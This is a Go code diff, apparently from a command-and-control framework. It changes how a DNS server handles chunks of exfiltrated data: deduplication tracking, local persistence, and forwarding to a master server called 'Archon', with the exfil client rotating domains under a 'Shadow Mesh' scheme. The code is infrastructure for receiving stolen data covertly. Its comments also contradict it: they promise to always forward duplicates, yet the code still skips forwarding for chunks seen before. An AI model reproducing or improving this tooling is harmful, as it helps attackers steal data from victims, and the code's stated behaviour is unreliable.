@@ -1013,15 +1013,17 @@ func (c2 *C2Manager) handleExfilChunk(encoded string, meta *ExfilMetadata, clien
 		return true, nil
 	}
 
-	// Ensure per-session dedupe map exists
-	var duplicate bool
+	// Track chunks received by this DNS server for stats, but DON'T block forwarding
+	// Multiple DNS servers may receive the same chunk (Shadow Mesh rotation)
+	// Archon handles deduplication - each DNS server should forward what it receives
+	var seenBefore bool
 
 	c2.mutex.Lock()
 	if session.ReceivedChunks == nil {
 		session.ReceivedChunks = make(map[uint32]bool)
 	}
 	if session.ReceivedChunks[meta.ChunkIndex] {
-		duplicate = true
+		seenBefore = true
 	} else {
 		session.ReceivedChunks[meta.ChunkIndex] = true
 		session.LastActivity = time.Now()
@@ -1032,10 +1034,15 @@ func (c2 *C2Manager) handleExfilChunk(encoded string, meta *ExfilMetadata, clien
 	}
 	c2.mutex.Unlock()
 
-	if duplicate {
-		return true, nil
-	}
+	// CRITICAL FIX: Don't return early for duplicates
+	// Shadow Mesh means exfil client rotates domains, so the same chunk
+	// may arrive at different DNS servers. Each server must forward to Archon.
+	// Archon's StoreExfilChunk() has proper deduplication with ON CONFLICT DO NOTHING
+	//
+	// Previous behavior would block forwarding if this DNS server saw the chunk before,
+	// which broke Shadow Mesh reliability when chunks arrived at multiple servers.
 
+	// Try to persist locally for retry capability
 	inserted := true
 	if c2.db != nil {
 		var dbErr error
@@ -1045,30 +1052,34 @@ func (c2 *C2Manager) handleExfilChunk(encoded string, meta *ExfilMetadata, clien
 				logf("[Exfil] DB persist failed (session=%s idx=%d): %v — caching in memory", sessionID, meta.ChunkIndex, dbErr)
 			}
 			c2.cacheChunkInMemory(session, meta.ChunkIndex, plaintext)
-			return true, nil
-		}
-		if !inserted {
-			// Chunk already on disk (likely due to retry) - treat as duplicate
-			return true, nil
+			// Don't return - still forward to Master
 		}
 	} else {
 		c2.cacheChunkInMemory(session, meta.ChunkIndex, plaintext)
 	}
 
+	// Update stats only if this is truly new to THIS DNS server
 	now := time.Now()
-	c2.mutex.Lock()
-	session.ReceivedCount++
-	session.LastChunkAt = now
-	if session.Status == "" {
-		session.Status = "receiving"
+	if !seenBefore && inserted {
+		c2.mutex.Lock()
+		session.ReceivedCount++
+		session.LastChunkAt = now
+		if session.Status == "" {
+			session.Status = "receiving"
+		}
+		c2.mutex.Unlock()
 	}
+
+	c2.mutex.Lock()
 	received := session.ReceivedCount
 	total := session.TotalChunks
 	c2.mutex.Unlock()
 
 	c2.persistExfilSession(session)
 
-	if masterClient != nil {
+	// ALWAYS forward to Master (unless we've seen it before AND already in DB)
+	// This allows Shadow Mesh to work: different DNS servers forward same chunk
+	if masterClient != nil && !seenBefore {
 		go c2.submitExfilChunkToMaster(session, meta, plaintext)
 	}
 
